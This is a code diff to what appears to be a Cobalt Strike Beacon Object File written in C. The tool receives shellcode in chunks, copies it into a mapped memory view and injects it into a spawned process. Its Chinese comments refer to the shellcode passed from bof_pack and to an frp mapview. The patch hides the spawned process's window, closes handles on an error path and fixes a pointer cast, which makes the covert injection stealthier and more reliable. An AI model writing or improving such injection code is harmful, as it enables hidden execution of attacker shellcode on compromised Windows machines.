@@ -16,6 +16,13 @@ void inject(char* peName, char* shellcode, SIZE_T shellcode_len) {
     PROCESS_INFORMATION pi ;
     fnmemset(&si, 0, sizeof(si));
     fnmemset(&pi, 0, sizeof(pi));
+    si.lpReserved = NULL;
+    si.lpDesktop = NULL;
+    si.lpTitle = NULL;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.cbReserved2 = NULL;
+    si.lpReserved2 = NULL;
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
     si.cb = sizeof(si);
@@ -171,11 +178,13 @@ void go(char* args, int length) {
             DWORD lastError = KERNEL32$GetLastError();
             BeaconPrintf(CALLBACK_ERROR, "[!] Could not MapViewOfFile, ERROR: %d", mapName, lastError);
             BeaconPrintf(CALLBACK_ERROR, "[!] Exiting BOF..");
+            KERNEL32$CloseHandle(mapAddr);
+            KERNEL32$CloseHandle(hMapFile);
             return;
         }
 
         /* 将从 bof_pack 传递过来的 shellcode copy 进 MapView 内存里 */
-        MSVCRT$memcpy((int)mapAddr + index, chunk, chunk_size);
+        MSVCRT$memcpy((SIZE_T)mapAddr + index, chunk, chunk_size);
         if (isUploadFinish) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Upload shellcode completed %d/%d, now spawn process (%s) to execute!", index + chunk_size, total_size, peName);
             /* 创建指示内存中已经存在frp 的 mapview */
